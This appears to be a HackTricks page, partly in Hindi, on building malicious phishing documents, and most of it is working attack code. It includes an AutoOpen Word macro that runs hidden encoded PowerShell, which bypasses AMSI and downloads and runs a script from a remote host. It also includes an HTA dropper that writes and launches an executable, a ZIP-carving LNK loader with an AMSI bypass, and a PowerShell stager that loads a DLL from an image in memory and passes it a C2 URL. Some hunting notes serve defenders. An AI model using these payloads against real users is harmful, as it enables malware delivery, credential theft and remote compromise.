# Phishing फ़ाइलें और दस्तावेज़

{{#include ../../banners/hacktricks-training.md}}

## Office दस्तावेज़

Microsoft Word किसी फ़ाइल को खोलने से पहले फ़ाइल डेटा का सत्यापन करता है। डेटा सत्यापन डेटा संरचना की पहचान के रूप में OfficeOpenXML मानक के अनुसार किया जाता है। यदि डेटा संरचना की पहचान के दौरान कोई त्रुटि होती है, तो विश्लेषण की जा रही फ़ाइल नहीं खोली जाएगी।

आमतौर पर, macros वाले Word फ़ाइलें `.docm` extension का उपयोग करती हैं। हालांकि, फ़ाइल एक्सटेंशन बदलकर फ़ाइल का नाम बदलने से उनकी macro executing क्षमताएँ बनी रह सकती हैं।\
उदाहरण के लिए, डिज़ाइन के अनुसार एक RTF फ़ाइल macros को support नहीं करती, लेकिन एक DOCM फ़ाइल जिसे RTF में rename किया गया है, उसे Microsoft Word द्वारा संभाला जाएगा और वह macro execution में सक्षम होगी।\
इसी तरह के internals और mechanisms Microsoft Office Suite (Excel, PowerPoint etc.) के सभी सॉफ़्टवेयर पर लागू होते हैं।

आप निम्नलिखित command का उपयोग यह जांचने के लिए कर सकते हैं कि किन एक्सटेंशनों को कुछ Office programs द्वारा execute किया जाएगा:
```bash
assoc | findstr /i "word excel powerp"
```
DOCX फाइलें जो किसी remote template (File –Options –Add-ins –Manage: Templates –Go) को reference करती हैं और जिनमें macros शामिल हैं, वे macros को भी “execute” कर सकती हैं।

### बाहरी इमेज लोड

Go to: _Insert --> Quick Parts --> Field_\
_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://<ip>/whatever

![](<../../images/image (155).png>)

### Macros Backdoor

Document से arbitrary code चलाने के लिए macros का उपयोग संभव है।

#### Autoload functions

जितने अधिक सामान्य वे होंगे, उतनी अधिक संभावना है कि AV उन्हें detect कर लेगा।

- AutoOpen()
- Document_Open()

#### Macros Code Examples
```vba
Sub AutoOpen()
CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
End Sub
```

```vba
Sub AutoOpen()

Dim Shell As Object
Set Shell = CreateObject("wscript.shell")
Shell.Run "calc"

End Sub
```

```vba
Dim author As String
author = oWB.BuiltinDocumentProperties("Author")
With objWshell1.Exec("powershell.exe -nop -Windowsstyle hidden -Command-")
.StdIn.WriteLine author
.StdIn.WriteBlackLines 1
```

```vba
Dim proc As Object
Set proc = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
proc.Create "powershell <beacon line generated>
```
#### Manually remove metadata

File > Info > Inspect Document > Inspect Document पर जाएँ, जो Document Inspector खोलेगा। **Inspect** पर क्लिक करें और फिर **Document Properties and Personal Information** के बगल में **Remove All** पर क्लिक करें।

#### Doc Extension

When finished, **Save as type** ड्रॉपडाउन चुनें और फॉर्मैट को **`.docx`** से **Word 97-2003 `.doc`** में बदलें।\
यह इसलिए करें क्योंकि आप **`.docx`** के अंदर मैक्रो को सेव नहीं कर सकते और macro-enabled **`.docm`** एक्सटेंशन के बारे में एक नकारात्मक धारण‍ा है (उदा. थंबनेल आइकन पर बड़ा `!` होता है और कुछ वेब/ईमेल गेटवे इन्हें पूरी तरह ब्लॉक कर देते हैं)। इसलिए यह पुराना **`.doc`** एक्सटेंशन सबसे अच्छा समझौता है।

#### Malicious Macros Generators

- MacOS
- [**macphish**](https://github.com/cldrn/macphish)
- [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)

## HTA Files

An HTA is a Windows program that **combines HTML and scripting languages (such as VBScript and JScript)**। यह यूज़र इंटरफ़ेस बनाता है और ब्राउज़र की सुरक्षा मॉडल की सीमाओं के बिना "fully trusted" एप्लिकेशन के रूप में चलता है।

An HTA is executed using **`mshta.exe`**, which is typically **installed** along with **Internet Explorer**, making **`mshta` dependant on IE**। इसलिए अगर इसे अनइंस्टॉल किया गया है, तो HTAs execute नहीं कर पाएँगे।
```html
<--! Basic HTA Execution -->
<html>
<head>
<title>Hello World</title>
</head>
<body>
<h2>Hello World</h2>
<p>This is an HTA...</p>
</body>

<script language="VBScript">
Function Pwn()
Set shell = CreateObject("wscript.Shell")
shell.run "calc"
End Function

Pwn
</script>
</html>
```

```html
<--! Cobal Strike generated HTA without shellcode -->
<script language="VBScript">
Function var_func()
var_shellcode = "<shellcode>"

Dim var_obj
Set var_obj = CreateObject("Scripting.FileSystemObject")
Dim var_stream
Dim var_tempdir
Dim var_tempexe
Dim var_basedir
Set var_tempdir = var_obj.GetSpecialFolder(2)
var_basedir = var_tempdir & "\" & var_obj.GetTempName()
var_obj.CreateFolder(var_basedir)
var_tempexe = var_basedir & "\" & "evil.exe"
Set var_stream = var_obj.CreateTextFile(var_tempexe, true , false)
For i = 1 to Len(var_shellcode) Step 2
var_stream.Write Chr(CLng("&H" & Mid(var_shellcode,i,2)))
Next
var_stream.Close
Dim var_shell
Set var_shell = CreateObject("Wscript.Shell")
var_shell.run var_tempexe, 0, true
var_obj.DeleteFile(var_tempexe)
var_obj.DeleteFolder(var_basedir)
End Function

var_func
self.close
</script>
```
## NTLM प्रमाणीकरण मजबूर करना

NTLM प्रमाणीकरण "remotely" को ज़बरदस्ती करने के कई तरीके हैं — उदाहरण के लिए, आप ईमेल या HTML में ऐसे **अदृश्य छवियाँ (invisible images)** जोड़ सकते हैं जिन्हें उपयोगकर्ता एक्सेस करेगा (यहाँ तक कि HTTP MitM?)। या पीड़ित को उन फ़ाइलों का **address** भेजें जो सिर्फ फ़ोल्डर खोलने भर से ही **प्रमाणीकरण (authentication)** को **trigger** कर दें।

**इन विचारों और अधिक को निम्न पृष्ठों में देखें:**


{{#ref}}
../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
{{#endref}}


{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### NTLM Relay

यह न भूलें कि आप केवल hash या प्रमाणीकरण चोरी ही नहीं कर सकते, बल्कि आप **perform NTLM relay attacks** भी कर सकते हैं:

- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)
- [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)

## LNK Loaders + ZIP-Embedded Payloads (fileless chain)

बहुत प्रभावी कैंपेन एक ZIP भेजते हैं जिसमें दो वैध decoy दस्तावेज़ (PDF/DOCX) और एक malicious .lnk होता है। चाल यह है कि वास्तविक PowerShell loader ZIP की raw bytes में एक यूनिक marker के बाद स्टोर होता है, और .lnk उसे carve करके पूरी तरह memory में चलाता है।

Typical flow implemented by the .lnk PowerShell one-liner:

1) मूल ZIP को सामान्य पाथ में खोजें: Desktop, Downloads, Documents, %TEMP%, %ProgramData%, और वर्तमान working directory के parent में।  
2) ZIP के bytes पढ़ें और एक hardcoded marker (उदा., xFIQCV) खोजें। marker के बाद जो कुछ भी है वही embedded PowerShell payload है।  
3) ZIP को %ProgramData% में कॉपी करें, वहीं extract करें, और वैध दिखने के लिए decoy .docx खोलें।  
4) वर्तमान प्रक्रिया के लिए AMSI को बायपास करें: [System.Management.Automation.AmsiUtils]::amsiInitFailed = $true  
5) अगले चरण की obfuscation हटाएँ (उदा., सभी # वर्ण हटाना) और इसे मेमोरी में execute करें।

Example PowerShell skeleton to carve and run the embedded stage:
```powershell
$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')
$paths    = @(
"$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents",
"$env:TEMP", "$env:ProgramData", (Get-Location).Path, (Get-Item '..').FullName
)
$zip = Get-ChildItem -Path $paths -Filter *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1
if(-not $zip){ return }
$bytes = [IO.File]::ReadAllBytes($zip.FullName)
$idx   = [System.MemoryExtensions]::IndexOf($bytes, $marker)
if($idx -lt 0){ return }
$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]
$code  = [Text.Encoding]::UTF8.GetString($stage) -replace '#',''
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
Invoke-Expression $code
```
Notes
- Delivery अक्सर प्रतिष्ठित PaaS सबडोमेन (उदाहरण के लिए, *.herokuapp.com) का दुरुपयोग करती है और payloads को gate कर सकती है (IP/UA के आधार पर benign ZIPs परोसना).
- अगला चरण अक्सर base64/XOR shellcode को डिक्रिप्ट करता है और डिस्क आर्टिफैक्ट्स कम करने के लिए इसे Reflection.Emit + VirtualAlloc के माध्यम से execute करता है।

Persistence used in the same chain
- COM TypeLib hijacking of the Microsoft Web Browser control ताकि IE/Explorer या कोई भी एप्लिकेशन जो इसे embed करता है स्वतः payload को पुनः लॉन्च कर दे। विवरण और तैयार-से-इस्तेमाल कमांड यहाँ देखें:

{{#ref}}
../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md
{{#endref}}

Hunting/IOCs
- ZIP फाइलें जिनमें archive data के अन्त में ASCII marker string (उदा., xFIQCV) जोड़ी गई हो।
- .lnk जो parent/user फ़ोल्डरों को enumerate करता है ताकि ZIP का पता लग सके और एक decoy document खोलता है।
- AMSI में छेड़छाड़ via [System.Management.Automation.AmsiUtils]::amsiInitFailed।
- Long-running business threads जो trusted PaaS domains पर होस्ट किए गए लिंक के साथ समाप्त होते हैं।

## Steganography-delimited payloads in images (PowerShell stager)

Recent loader chains एक obfuscated JavaScript/VBS deliver करते हैं जो Base64 PowerShell stager को decode और run करता है। वह stager एक image (अक्सर GIF) डाउनलोड करता है जो unique start/end markers के बीच plain text के रूप में छिपी Base64-encoded .NET DLL रखता है। स्क्रिप्ट इन delimiters (जंगली में देखे गए उदाहरण: «<<sudo_png>> … <<sudo_odt>>>») की तलाश करती है, बीच का टेक्स्ट extract करती है, उसे Base64-decode कर bytes में बदलती है, assembly को in-memory load करती है और C2 URL के साथ एक ज्ञात entry method को invoke करती है।

Workflow
- Stage 1: Archived JS/VBS dropper → embedded Base64 को decode करता है → PowerShell stager लॉन्च करता है with -nop -w hidden -ep bypass।
- Stage 2: PowerShell stager → image डाउनलोड करता है, marker-delimited Base64 को carve करता है, .NET DLL को in-memory load करता है और उसकी method (उदा., VAI) को C2 URL और options पास करते हुए call करता है।
- Stage 3: Loader final payload को retrieve करता है और आमतौर पर इसे process hollowing के द्वारा trusted binary (आम तौर पर MSBuild.exe) में inject करता है। process hollowing और trusted utility proxy execution के बारे में और जानें यहाँ:

{{#ref}}
../../reversing/common-api-used-in-malware.md
{{#endref}}

PowerShell example to carve a DLL from an image and invoke a .NET method in-memory:

<details>
<summary>PowerShell stego payload extractor and loader</summary>
```powershell
# Download the carrier image and extract a Base64 DLL between custom markers, then load and invoke it in-memory
param(
[string]$Url    = 'https://example.com/payload.gif',
[string]$StartM = '<<sudo_png>>',
[string]$EndM   = '<<sudo_odt>>',
[string]$EntryType = 'Loader',
[string]$EntryMeth = 'VAI',
[string]$C2    = 'https://c2.example/payload'
)
$img = (New-Object Net.WebClient).DownloadString($Url)
$start = $img.IndexOf($StartM)
$end   = $img.IndexOf($EndM)
if($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }
$b64 = $img.Substring($start + $StartM.Length, $end - ($start + $StartM.Length))
$bytes = [Convert]::FromBase64String($b64)
$asm = [Reflection.Assembly]::Load($bytes)
$type = $asm.GetType($EntryType)
$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')
$null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))
```
</details>

Notes
- यह ATT&CK T1027.003 (steganography/marker-hiding) है। मार्कर्स अभियानों के बीच अलग-अलग होते हैं।
- AMSI/ETW bypass और string deobfuscation आम तौर पर assembly लोड करने से पहले लागू होते हैं।
- Hunting: डाउनलोड की गई images को known delimiters के लिए स्कैन करें; PowerShell द्वारा images तक पहुंचकर तुरंत Base64 blobs को डिकोड करने की पहचान करें।

See also stego tools and carving techniques:

{{#ref}}
../../crypto-and-stego/stego-tricks.md
{{#endref}}

## JS/VBS droppers → Base64 PowerShell staging

A recurring initial stage is a small, heavily‑obfuscated `.js` or `.vbs` delivered inside an archive. Its sole purpose is to decode an embedded Base64 string and launch PowerShell with `-nop -w hidden -ep bypass` to bootstrap the next stage over HTTPS.

Skeleton logic (abstract):
- अपने फ़ाइल की सामग्री पढ़ें
- junk strings के बीच एक Base64 blob खोजें
- ASCII PowerShell में decode करें
- `wscript.exe`/`cscript.exe` के साथ execute करें जो `powershell.exe` को invoke करते हैं

Hunting cues
- Archived JS/VBS attachments जो कमांड लाइन में `-enc`/`FromBase64String` के साथ `powershell.exe` spawn कर रहे हैं।
- `wscript.exe` जो user temp paths से `powershell.exe -nop -w hidden` लॉन्च कर रहा है।

## Windows files to steal NTLM hashes

नीचे दिए पेज को देखें: **places to steal NTLM creds**:

{{#ref}}
../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
{{#endref}}


## References

- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)
- [MITRE ATT&CK – Process Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)
- [MITRE ATT&CK – Trusted Developer Utilities Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)

{{#include ../../banners/hacktricks-training.md}}
